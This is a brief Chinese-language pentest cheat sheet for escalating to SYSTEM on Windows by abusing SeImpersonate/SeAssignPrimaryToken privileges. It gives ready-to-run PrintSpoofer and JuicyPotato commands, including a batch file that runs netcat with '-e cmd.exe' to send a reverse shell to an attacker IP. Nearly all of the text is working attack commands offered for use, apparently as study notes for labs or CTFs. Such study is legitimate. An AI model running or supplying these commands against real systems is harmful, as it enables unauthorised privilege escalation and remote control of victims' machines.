# SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege（或全有）

```clike
https://github.com/dievus/printspoofer
printspoofer.exe -i -c cmd
```

也可以使用烂土豆，稍微麻烦一点

```clike
如果开启SeImpersonate权限，juicypotato的参数可以使用-t t
如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u
如果均开启，可以选择-t *
如果均未开启，那么无法提权
然后就是查看rpc端口号，如果不是135（例如111）
加参数 -n 111

烂土豆和nc事先传上去
echo C:\users\Destitute\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1340 > rev.bat

juicypotato.exe -p C:\users\Destitute\appdata\local\temp\rev.bat -l 1340 -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```
